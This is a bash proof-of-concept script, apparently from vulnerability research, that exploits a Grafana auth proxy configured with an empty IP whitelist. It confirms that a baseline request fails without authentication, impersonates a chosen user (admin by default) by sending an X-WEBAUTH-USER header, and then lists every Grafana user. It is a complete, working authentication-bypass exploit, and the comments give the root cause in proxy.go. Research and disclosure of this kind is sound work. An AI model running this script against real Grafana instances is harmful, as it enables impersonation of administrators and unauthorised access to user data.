#!/usr/bin/env bash
# poc.sh — H6: Grafana auth proxy empty whitelist — authentication bypass
#
# Precondition: Grafana running with GF_AUTH_PROXY_ENABLED=true and empty whitelist.
# To provision: bash setup.sh
#
# Vulnerability:
#   proxy.go:200-202 — isAllowedIP() returns true when len(acceptedIPs)==0
#   parseAcceptList("") returns nil => len 0 => all IPs trusted
#   Any client can authenticate as any Grafana user by setting X-WEBAUTH-USER.
set -euo pipefail

GRAFANA_URL="${GRAFANA_URL:-http://localhost:3001}"
TARGET_USER="${1:-admin}"

# 1 — Baseline: confirm normal requests require auth
STATUS_NO_HEADER=$(curl -s -o /dev/null -w "%{http_code}" "${GRAFANA_URL}/api/org")
[ "$STATUS_NO_HEADER" = "401" ] || { echo "[-] Expected 401 without header, got $STATUS_NO_HEADER"; exit 1; }
echo "[baseline] /api/org without header => $STATUS_NO_HEADER (correct)"

# 2 — Exploit: inject proxy header, expect 200 (no whitelist enforcement)
TMP=$(mktemp)
STATUS=$(curl -s -o "$TMP" -w "%{http_code}" \
  -H "X-WEBAUTH-USER: ${TARGET_USER}" \
  "${GRAFANA_URL}/api/org")
BODY=$(cat "$TMP"); rm -f "$TMP"

echo "[exploit] X-WEBAUTH-USER: ${TARGET_USER}  =>  HTTP $STATUS"
echo "[body]    $BODY"

if [ "$STATUS" = "200" ]; then
  echo ""
  echo "[CONFIRMED] Authentication bypass — impersonated '${TARGET_USER}' from arbitrary IP"
  echo "            Root cause: isAllowedIP() returns true for empty acceptedIPs slice"
  echo "            (proxy.go:200-202)"

  # 3 — Show admin privileges: list all users
  USERS=$(curl -s -H "X-WEBAUTH-USER: ${TARGET_USER}" "${GRAFANA_URL}/api/users")
  echo "[users]   $USERS"
  exit 0
else
  echo "[-] Exploit failed (HTTP $STATUS) — instance may be patched or misconfigured"
  exit 1
fi
